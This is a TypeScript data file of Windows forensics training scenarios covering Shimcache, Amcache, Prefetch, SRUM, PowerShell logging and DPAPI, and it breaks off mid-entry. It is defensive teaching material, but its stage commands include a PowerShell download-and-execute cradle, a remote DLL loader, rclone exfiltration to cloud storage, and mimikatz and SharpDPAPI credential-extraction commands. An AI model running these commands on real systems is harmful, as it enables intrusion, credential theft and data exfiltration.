import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const DFIR_OFFICIAL_BATCH2_WINDOWS_ARTIFACTS_SCENARIOS: LegacyDraftScenario[] = [
  {
    id: 'dfir-shimcache-amcache-execution-artifact-triage',
    title: 'Mandiant, ANSSI & SANS DFIR — Application Compatibility Shimcache (AppCompatCache) & Amcache.hve Triage',
    category: 'MALWARE',
    mitreId: 'T1059.003',
    description:
      'Grounded in the Mandiant Application Compatibility Cache (Shimcache) Whitepaper, ANSSI Amcache.hve Analysis Guide, and SANS FOR508: even after an attacker deletes a staging binary (C:\\Users\\Public\\psexec64.exe) and clears Event Logs, Windows preserves its LastModifiedTime and execution flag in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache and its full SHA-1 FileId hash, PE CompileTime, and size in C:\\Windows\\AppCompat\\Programs\\Amcache.hve.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Self-Deleting Tool (psexec64)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Kernel ApphelpCacheControl', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'SYSTEM Hive (AppCompatCache)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'AppCompatCacheParser & Amcache', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Amcache.hve (SHA-1 FileId)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Ephemeral Binary Execution & Kernel ApphelpCacheControl In-Memory Tracking',
        narration:
          'The attacker drops and executes C:\\Users\\Public\\psexec64.exe before immediately deleting the file via del /f /q. During CreateProcessW, kernel32.dll / ntdll.dll invokes NtApphelpCacheControl to check whether the executable requires application compatibility shims, inserting an entry into the kernel in-memory LRU Shimcache table.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Execution (T1059.003 - Windows Command Shell & AppCompat Tracking)',
        technicalCommands: [
          'C:\\Users\\Public\\psexec64.exe -accepteula \\\\10.10.0.10 cmd.exe',
          'del /f /q C:\\Users\\Public\\psexec64.exe',
          'Kernel Syscall: NtApphelpCacheControl(ApphelpCacheServiceLookup) inserts path + $SI LastModifiedTime into kernel LRU list',
        ],
        defenseMitigation:
          'Collect both live memory and the SYSTEM registry hive during triage because in-memory Shimcache entries are flushed to the SYSTEM hive upon clean shutdown or reboot.',
        logs: [
          {
            id: 'dfir-shim-1',
            timestamp: '09:14:22.104',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 1,
            ProcessName: 'psexec64.exe',
            CommandLine: 'C:\\Users\\Public\\psexec64.exe -accepteula \\\\10.10.0.10 cmd.exe',
            raw: 'EventID: 1 | Image: C:\\Users\\Public\\psexec64.exe | Hashes: SHA1=A94A8FE5CCB19BA61C4C0873D391E987982FBBD3 | Note: File deleted 4 seconds after execution; tracked in ApphelpCacheControl.',
            parsedFields: {
              ExecutablePath: 'C:\\Users\\Public\\psexec64.exe',
              KernelSubsystem: 'NtApphelpCacheControl (Win10/11 10ts magic header)',
              AntiForensicAction: 'del /f /q C:\\Users\\Public\\psexec64.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Amcache.hve InventoryApplicationFile SHA-1 Hash & PE Header Persistence',
        narration:
          'Concurrently, the Application Experience service (aelupsvc / CompatTelRunner.exe) writes a permanent record into C:\\Windows\\AppCompat\\Programs\\Amcache.hve under Root\\InventoryApplicationFile\\psexec64.exe|<Hash>, storing the lowercased full path, FileId (0000 + SHA-1 hash of the first 31.4 MB of the binary), LinkDate (PE compile timestamp), and BinaryType.',
        activeNodes: ['firewall', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1070.004 - File Deletion Defeated by Amcache.hve SHA-1)',
        technicalCommands: [
          'AmcacheParser.exe -f "C:\\Windows\\AppCompat\\Programs\\Amcache.hve" --csv C:\\Forensics',
          'Hive Key: Amcache.hve\\Root\\InventoryApplicationFile\\psexec64.exe|f8192a01b2c3d4e5',
          'Values: LowerCaseLongPath="c:\\users\\public\\psexec64.exe", FileId="0000a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"',
        ],
        defenseMitigation:
          'Parse Amcache.hve (plus Amcache.hve.LOG1 and .LOG2 transaction logs) with AmcacheParser.exe and enrich all FileId SHA-1 hashes (stripping the leading 0000) against threat intelligence feeds.',
        logs: [
          {
            id: 'dfir-shim-2',
            timestamp: '09:14:23.012',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 100,
            ProcessName: 'AmcacheParser.exe',
            CommandLine: 'AmcacheParser.exe -f C:\\Windows\\AppCompat\\Programs\\Amcache.hve --nl false',
            raw: 'AMCACHE_RECORD: SubKey="Root\\InventoryApplicationFile" FullPath="c:\\users\\public\\psexec64.exe" SHA1="a94a8fe5ccb19ba61c4c0873d391e987982fbbd3" KeyLastWriteTimestamp="2026-11-03 09:14:22.810" LinkDate="2023-10-12 18:22:10" Publisher="Sysinternals"',
            parsedFields: {
              ForensicHive: 'C:\\Windows\\AppCompat\\Programs\\Amcache.hve',
              RegistrySubKey: 'Root\\InventoryApplicationFile',
              RecoveredSha1: 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (FileId strip 0000)',
              KeyLastWriteUtc: '2026-11-03 09:14:22.810',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM Hive AppCompatCache (10ts Signature) Temporal Order Reconstruction',
        narration:
          'Parsing HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache with AppCompatCacheParser.exe extracts the Windows 10/11 "10ts" (0x31 0x30 0x74 0x73) binary structure. The CacheEntryPosition index reveals the exact chronological order in which psexec64.exe was evaluated relative to neighboring processes.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Discovery (T1083 - Chronological Execution Reconstruction via Shimcache)',
        technicalCommands: [
          'AppCompatCacheParser.exe -f "C:\\Windows\\System32\\config\\SYSTEM" --csv C:\\Forensics',
          'Registry Value: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\\AppCompatCache',
          'Header Magic: 31 30 74 73 ("10ts") | CacheEntryPosition=14 | Path="C:\\Users\\Public\\psexec64.exe"',
        ],
        defenseMitigation:
          'Correlate AppCompatCache CacheEntryPosition ordering with Amcache.hve KeyLastWriteTimestamp and SHA-1 hashes to prove binary presence and execution even when event logs and files are wiped.',
        logs: [
          {
            id: 'dfir-shim-3',
            timestamp: '09:20:00.500',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 101,
            ProcessName: 'AppCompatCacheParser.exe',
            CommandLine: 'AppCompatCacheParser.exe -f C:\\Windows\\System32\\config\\SYSTEM',
            raw: 'SHIMCACHE_ENTRY: ControlSet="ControlSet001" CacheEntryPosition=14 Path="C:\\Users\\Public\\psexec64.exe" LastModifiedTimeUTC="2023-10-12 18:22:10" Executed="Yes" Signature="10ts"',
            parsedFields: {
              RegistryKey: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache',
              HeaderSignature: '10ts (0x31307473 Windows 10/11/Server 2019+)',
              CacheEntryPosition: '14 (MRU Order)',
              ExecutedFlag: 'Yes',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-windows-prefetch-srum-network-execution-trace',
    title: 'NIST SP 800-86 & SANS DFIR — Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace',
    category: 'MALWARE',
    mitreId: 'T1041',
    description:
      'Grounded in SANS DFIR Windows Artifact Analysis, Microsoft System Resource Usage Monitor (SRUM) architecture, and NIST SP 800-86: when an attacker renames rclone.exe to svchost_upd.exe, runs it to exfiltrate data over HTTPS, and deletes the binary, Windows Prefetch (C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-<Hash>.pf) records the run count, last 8 execution timestamps, and every referenced file/directory, while C:\\Windows\\System32\\sru\\SRUDB.dat logs the exact Process SID, AppId, and BytesSent.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Masqueraded rclone (svchost_upd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'SysMain / Prefetcher Engine', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Prefetch (*.pf MAM Compressed)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'PECmd & SrumECmd Forensics', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'SRUDB.dat (ESE Network Usage)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace',
        narration:
          'The attacker renames rclone.exe to C:\\ProgramData\\svchost_upd.exe and runs svchost_upd.exe copy C:\\Finance mega:exfil. For the first 10 seconds of process execution, the Windows kernel memory manager and SysMain (Superfetch) service monitor every DLL, configuration file, and directory touched by the process.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1036.005 - Masquerading: Match Legitimate Name or Location)',
        technicalCommands: [
          'C:\\ProgramData\\svchost_upd.exe copy C:\\Finance\\Q4_M_and_A mega:exfil_bucket --config C:\\ProgramData\\rclone.conf',
          'SysMain Service writes compressed MAM (0x04 0x4D 0x41 0x4D) Prefetch file after 10s trace window',
        ],
        defenseMitigation:
          'Ensure Prefetch is enabled on both Windows Workstations and Windows Servers (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 3) for high-fidelity DFIR execution artifacts.',
        logs: [
          {
            id: 'dfir-pf-1',
            timestamp: '01:12:04.330',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain (Writing SVCHOST_UPD.EXE-9A41C20F.pf)',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\svchost.exe | TargetFilename: C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf | HeaderMagic: 4D414D04 (MAM LZXPRESS Huffman Compressed)',
            parsedFields: {
              PrefetchFile: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              CompressionHeader: 'MAM\\x04 (LZXPRESS Huffman Win10/11)',
              TracedExecutable: 'C:\\ProgramData\\svchost_upd.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Prefetch (.pf) Run Count, Last 8 Execution Timestamps & Referenced File Handles (PECmd)',
        narration:
          'Decompressing and parsing SVCHOST_UPD.EXE-9A41C20F.pf with PECmd.exe reveals RunCount=2, the last 8 execution timestamps in UTC, Volume serial numbers, and the complete list of files opened during startup—including C:\\ProgramData\\rclone.conf and C:\\Finance\\Q4_M_and_A\\Merger_Terms.xlsx—proving the masqueraded binary was actually Rclone reading sensitive files.',
        activeNodes: ['target', 'siem', 'ad'],
        mitreTactic: 'Collection (T1005 - Data from Local System Proved via Prefetch File Metrics)',
        technicalCommands: [
          'PECmd.exe -f "C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf" --csv C:\\Forensics',
          'Prefetch Version: 30 (Win10/11) | RunCount: 2 | LastRun: 2026-11-03 01:11:54 UTC',
          'FilesReferenced: \\VOLUME{01d9...}\\PROGRAMDATA\\RCLONE.CONF, \\VOLUME{01d9...}\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX',
        ],
        defenseMitigation:
          'During incident response, parse all C:\\Windows\\Prefetch\\*.pf files with PECmd.exe and search the FilesReferenced array for staging archives (.7z, .rar), rclone.conf, or credential stores.',
        logs: [
          {
            id: 'dfir-pf-2',
            timestamp: '01:25:10.100',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 30,
            ProcessName: 'PECmd.exe',
            CommandLine: 'PECmd.exe -f C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
            raw: 'PREFETCH_PARSE: ExecutableName="SVCHOST_UPD.EXE" Hash="9A41C20F" RunCount=2 LastRun="2026-11-03 01:11:54"PreviousRun0="2026-11-03 01:08:12" FilesReferenced="C:\\PROGRAMDATA\\RCLONE.CONF; C:\\FINANCE\\Q4_M_AND_A\\MERGER_TERMS.XLSX"',
            parsedFields: {
              ArtifactPath: 'C:\\Windows\\Prefetch\\SVCHOST_UPD.EXE-9A41C20F.pf',
              RunCount: '2',
              LastRunUtc: '2026-11-03 01:11:54',
              SmokingGunReference: 'C:\\PROGRAMDATA\\RCLONE.CONF & MERGER_TERMS.XLSX',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SRUM Database (SRUDB.dat) Network Data Usage Attribution ({973F5D5C-1D90-4944-BE8E-24B94231A174})',
        narration:
          'To quantify the exact volume of data exfiltrated even after the binary was deleted and firewall logs rolled over, the analyst parses C:\\Windows\\System32\\sru\\SRUDB.dat (cross-referenced with the SOFTWARE hive for SruDbIdMapTable SIDs) using SrumECmd.exe. Table {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage Monitor) proves \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe transmitted 1,482,910,208 BytesSent under User SID S-1-5-21-...-1104.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel Quantified via SRUM)',
        technicalCommands: [
          'SrumECmd.exe -f "C:\\Windows\\System32\\sru\\SRUDB.dat" -r "C:\\Windows\\System32\\config\\SOFTWARE" --csv C:\\Forensics',
          'SRUM Table GUID: {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage)',
          'AppId: \\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe | BytesSent: 1,482,910,208 (1.48 GB)',
        ],
        defenseMitigation:
          'Always acquire C:\\Windows\\System32\\sru\\SRUDB.dat alongside C:\\Windows\\System32\\config\\SOFTWARE during breach scoping to prove or disprove data exfiltration volumes per process and user SID.',
        logs: [
          {
            id: 'dfir-pf-3',
            timestamp: '01:30:00.400',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 973,
            ProcessName: 'SrumECmd.exe',
            CommandLine: 'SrumECmd.exe -f C:\\Windows\\System32\\sru\\SRUDB.dat -r C:\\Windows\\System32\\config\\SOFTWARE',
            raw: 'SRUM_NETWORK_USAGE: Table="{973F5D5C-1D90-4944-BE8E-24B94231A174}" Timestamp="2026-11-03 01:15:00" ExeInfo="\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe" UserSid="S-1-5-21-3819201-1104" BytesSent=1482910208 BytesRecvd=14209120',
            parsedFields: {
              ForensicDatabase: 'C:\\Windows\\System32\\sru\\SRUDB.dat',
              SrumTableGuid: '{973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Usage)',
              TrackedProcess: '\\Device\\HarddiskVolume3\\ProgramData\\svchost_upd.exe',
              ExfiltratedBytesSent: '1,482,910,208 bytes (1.48 GB)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-powershell-eid4104-4103-clm-downgrade-forensics',
    title: 'Microsoft PowerShell Team, CISA & Mandiant DFIR — PowerShell EventID 4104 / 4103, Engine v2.0 Downgrade & PSReadLine History',
    category: 'MALWARE',
    mitreId: 'T1059.001',
    description:
      'Grounded in Microsoft PowerShell Team Logging Specifications, CISA PowerShell Security Guidance, and Mandiant DFIR research: an adversary attempts to bypass AMSI and Script Block Logging by launching powershell.exe -Version 2 (generating Windows PowerShell EventID 400 with EngineVersion=2.0 vs HostVersion=5.1), while post-exploitation commands on v5.1 hosts are captured in de-obfuscated form by EventID 4104 (ScriptBlockLogging), EventID 4103 (ModuleLogging), and %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Obfuscated PowerShell Stager', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'System.Management.Automation', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PowerShell Operational (4104)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'EID 400, 4103, 4104 & PSReadLine', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'ConsoleHost_history.txt', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: PowerShell v2.0 Engine Downgrade Detection (Windows PowerShell EventID 400 EngineVersion=2.0)',
        narration:
          'To evade AMSI and PowerShell v5 Script Block Logging, the attacker runs powershell.exe -Version 2 -NoP -Command "...". When the legacy .NET 2.0 CLR engine initializes, the classic "Windows PowerShell" event log records EventID 400 (Engine state is changed from None to Available) with HostVersion=5.1.19041.3570 juxtaposed against EngineVersion=2.0.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1562.001 - PowerShell v2.0 Downgrade Attack)',
        technicalCommands: [
          'powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.4.99/stager.ps1\')"',
          'LogName="Windows PowerShell" EventID=400: EngineVersion=2.0 | HostVersion=5.1.19041.3570',
        ],
        defenseMitigation:
          'Disable and remove the optional MicrosoftWindowsPowerShellV2 and MicrosoftWindowsPowerShellV2Root features via Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root.',
        logs: [
          {
            id: 'dfir-ps-1',
            timestamp: '10:05:14.112',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 400,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -Version 2 -NoProfile -Command "IEX ..."',
            raw: 'LogName: Windows PowerShell | EventID: 400 | EngineState: Available | EngineVersion: 2.0 | HostName: ConsoleHost | HostVersion: 5.1.19041.3570 | HostApplication: powershell.exe -Version 2 -NoProfile',
            parsedFields: {
              LogChannel: 'Windows PowerShell',
              EventID: '400 (Engine Lifecycle)',
              HostVersion: '5.1.19041.3570',
              EngineVersion: '2.0 (Downgrade Attack Detected)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Dynamic De-Obfuscation in Script Block Logging (EventID 4104) & Pipeline Binding (EventID 4103)',
        narration:
          'When v2 is disabled and the attacker runs a multi-layer Base64/XOR Invoke-Expression payload on PowerShell 5.1, every dynamic IEX evaluation passes a newly unpacked script block to System.Management.Automation, which logs the fully de-obfuscated plaintext code under Microsoft-Windows-PowerShell/Operational EventID 4104 (MessageNumber 1 of N, Level=Warning for suspicious APIs) and logs resolved parameter bindings under EventID 4103.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.001 - PowerShell EventID 4104 Dynamic De-Obfuscation)',
        technicalCommands: [
          'Microsoft-Windows-PowerShell/Operational EventID 4104 (Execute a Remote Command / ScriptBlockText)',
          'Microsoft-Windows-PowerShell/Operational EventID 4103 (CommandInvocation / ParameterBinding)',
          'Automatic Warning Trigger: System.Reflection.Assembly::Load, VirtualAlloc, MiniDumpWriteDump',
        ],
        defenseMitigation:
          'Enable Turn on PowerShell Script Block Logging and Turn on Module Logging (*) via Group Policy, along with Protected Event Logging (CMS encryption) to prevent credential leakage in logs.',
        logs: [
          {
            id: 'dfir-ps-2',
            timestamp: '10:05:19.840',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4104,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
            raw: 'LogName: Microsoft-Windows-PowerShell/Operational | EventID: 4104 | Level: Warning | MessageNumber: 1 | MessageTotal: 1 | ScriptBlockId: 8f19c2a0-4412-4b99-9120-aabbccddeeff | ScriptBlockText: $bytes = (New-Object Net.WebClient).DownloadData("https://198.51.100.20/beacon.dll"); [System.Reflection.Assembly]::Load($bytes)',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-PowerShell/Operational',
              EventID: '4104 (Script Block Logging) / 4103 (Module Pipeline)',
              ScriptBlockId: '8f19c2a0-4412-4b99-9120-aabbccddeeff',
              DeobfuscatedScript: '[System.Reflection.Assembly]::Load($bytes)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Persistent Interactive Command Recovery from PSReadLine ConsoleHost_history.txt',
        narration:
          'During interactive keyboard or pasted console sessions, the PowerShell PSReadLine module appends up to 4,096 commands directly to %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt on disk—even when InPrivate or Clear-History is invoked—preserving plaintext credentials and lateral movement commands for DFIR triage.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Collection (T1059.001 - PSReadLine ConsoleHost_history.txt Disk Artifact)',
        technicalCommands: [
          'Artifact Path: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
          'Get-Content C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
        ],
        defenseMitigation:
          'Include %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt across all user profiles in every Windows DFIR triage collection profile (such as KAPE PowerShell targets).',
        logs: [
          {
            id: 'dfir-ps-3',
            timestamp: '10:06:02.110',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'powershell.exe',
            CommandLine: 'PSReadLine writing interactive session history to ConsoleHost_history.txt',
            raw: 'Artifact: C:\\Users\\admin_ops\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | RecoveredLines: "$pass = ConvertTo-SecureString \'Winter2026!\' -AsPlainText -Force; Invoke-Command -ComputerName CORP-DC01 -ScriptBlock { whoami }"',
            parsedFields: {
              ArtifactFile: '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
              ModuleOrigin: 'PSReadLine (Default in Windows PowerShell 5.1 & PowerShell 7)',
              EvidentiaryValue: 'Survives Clear-History cmdlet and session termination',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-dpapi-masterkey-lsass-browser-vault-forensics',
    title: 'Microsoft DPAPI, SpecterOps & Elastic DFIR — DPAPI MasterKey Backup RPC & Browser/Vault Credential Theft (EID 4692 / 4693)',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1555.004',
    description:
      'Grounded in Microsoft Data Protection API (DPAPI) documentation, SpecterOps DPAPI abuse research, and Elastic Security Labs infostealer forensics: an attacker or stealer accesses DPAPI MasterKey files under %APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>, requests domain MasterKey decryption from the Domain Controller via the MS-BKRP BackupKey RPC protocol (logging Security EventID 4692 / 4693 on the DC), and decrypts Windows Credentials (%LOCALAPPDATA%\\Microsoft\\Credentials) and Chromium Local State AES-GCM keys.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'SharpDPAPI / Stealer Process', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'MS-BKRP RPC (protected_storage)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'MasterKey (%APPDATA%\\Protect)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'DC Security EID 4692 & 4693', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'CORP-DC01 BackupKey Secret', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: DPAPI Blob & Preferred MasterKey GUID Enumeration in %APPDATA%\\Microsoft\\Protect',
        narration:
          'The attacker enumerates encrypted DPAPI credential blobs in %LOCALAPPDATA%\\Microsoft\\Credentials\\ and Chromium "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State" (encrypted_key prefixed with "DPAPI"). Each DPAPI blob header contains a guidMasterKey that maps to a MasterKey file in %APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>.',
        activeNodes: ['attacker', 'target'],
        mitreTactic: 'Credential Access (T1555.004 - Credentials from Password Stores: Windows Credential Manager)',
        technicalCommands: [
          'SharpDPAPI.exe triage',
          'MasterKey Path: C:\\Users\\admin_ops\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\{84a19c02-5511-4d88-9012-112233445566}',
          'Chromium Key Path: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State (os_crypt.encrypted_key)',
        ],
        defenseMitigation:
          'Monitor non-browser processes accessing %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State, Login Data, and %APPDATA%\\Microsoft\\Protect\\<SID>\\* via Sysmon file/handle telemetry or SACLs (EventID 4663).',
        logs: [
          {
            id: 'dfir-dpapi-1',
            timestamp: '14:22:01.105',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 4663,
            ProcessName: 'SharpDPAPI.exe',
            CommandLine: 'SharpDPAPI.exe credentials /unprotect',
            raw: 'EventID: 4663 | SubjectUserName: admin_ops | ObjectName: C:\\Users\\admin_ops\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3819201-1104\\84a19c02-5511-4d88-9012-112233445566 | ProcessName: C:\\Users\\Public\\SharpDPAPI.exe | AccessMask: 0x1 (ReadData)',
            parsedFields: {
              EventID: '4663 (Object Access on DPAPI Protect Folder)',
              MasterKeyGuid: '{84a19c02-5511-4d88-9012-112233445566}',
              MasterKeyFolder: '%APPDATA%\\Microsoft\\Protect\\<SID>\\',
              ExecutingProcess: 'SharpDPAPI.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Domain Controller MS-BKRP BackupKey RPC Recovery (DC Security EventID 4693)',
        narration:
          'For domain users, every MasterKey file contains a Domain Backup MasterKey encrypted with the Active Directory Domain Controller public key (G$BCKUPKEY_PREFERRED). Using either the user session via MS-BKRP (BackuprKey RPC over \\pipe\\protected_storage) or a stolen Domain Backup PFX key, the attacker decrypts the MasterKey, triggering Windows Security EventID 4693 (Recovery of data protection master key was attempted) on CORP-DC01.',
        activeNodes: ['attacker', 'firewall', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1555.004 - MS-BKRP BackupKey RPC & EventID 4693)',
        technicalCommands: [
          'RPC Interface: MS-BKRP (3dde7c30-165d-11d1-ab8f-00805f14db40) over \\pipe\\protected_storage',
          'DC Security EventID 4693: Recovery of data protection master key was attempted (MasterKeyId={84a19c02-...})',
          'mimikatz lsadump::backupkeys /system:CORP-DC01.corp.local /export',
        ],
        defenseMitigation:
          'Enable Audit DPAPI Activity on Domain Controllers and workstations to log Security EventID 4692 (Backup of master key) and EventID 4693 (Recovery of master key), and alert on bulk MasterKey recovery bursts.',
        logs: [
          {
            id: 'dfir-dpapi-2',
            timestamp: '14:22:02.410',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4693,
            ProcessName: 'lsass.exe',
            CommandLine: 'MS-BKRP BackuprKey MasterKey recovery on CORP-DC01',
            raw: 'EventID: 4693 | Computer: CORP-DC01.corp.local | SubjectUserName: admin_ops | MasterKeyId: 84a19c02-5511-4d88-9012-112233445566 | RecoveryServer: CORP-DC01.corp.local | RecoveryReason: 0x5c0000 | Status: 0x0',
            parsedFields: {
              EventID: '4693 (DPAPI MasterKey Recovery Attempted)',
              RpcProtocol: 'MS-BKRP (\\pipe\\protected_storage)',
              MasterKeyId: '84a19c02-5511-4d88-9012-112233445566',
              DomainSecretObject: 'G$BCKUPKEY_PREFERRED (LSA Secret)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Offline Decryption of Windows Vault (.vcrd) & Chromium Login Data / Cookies SQLite Databases',
        narration:
          'Armed with the plaintext 64-byte SHA-1 DPAPI MasterKey, the attacker calls CryptUnprotectData (or offline dpapick3 / SharpDPAPI) to unwrap the AES-256-GCM key in Chrome/Edge Local State and decrypts all saved passwords and session cookies from Login Data and Network\\Cookies SQLite databases.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1555.003 - Credentials from Web Browsers & Windows Vault)',
        technicalCommands: [
          'SharpDPAPI.exe logins /mkfile:masterkeys.txt',
          'Decrypted Target 1: %LOCALAPPDATA%\\Microsoft\\Vault\\{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\\*.vcrd',
          'Decrypted Target 2: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data (v10 AES-256-GCM)',
        ],
        defenseMitigation:
          'Enforce hardware-bound App-Bound Encryption (Chrome v127+ v20 elevation service protection) and disable browser password saving via enterprise GPO.',
        logs: [
          {
            id: 'dfir-dpapi-3',
            timestamp: '14:22:04.880',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4663,
            ProcessName: 'SharpDPAPI.exe',
            CommandLine: 'SharpDPAPI.exe decrypting Chrome Login Data & Windows Vault .vcrd blobs',
            raw: 'EventID: 4663 | SubjectUserName: admin_ops | ObjectName: C:\\Users\\admin_ops\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data | ProcessName: C:\\Users\\Public\\SharpDPAPI.exe | DecryptedItems: 42 Vault/Browser Credentials',
            parsedFields: {
              EventID: '4663 (File Object Read)',
              TargetedStores: 'Windows Vault (.vcrd) + Chrome Login Data & Cookies',
              EncryptionScheme: 'DPAPI MasterKey -> AES-256-GCM (v10 prefix)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-golden-ticket-krbtgt-eid4768-4769-lifetime-anomaly',
    title: 'Microsoft Defender for Identity, CERT-FR & MITRE DFIR — Kerberos Golden Ticket Forgery Forensics (EID 4768 / 4769)',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1558.001',
    description:
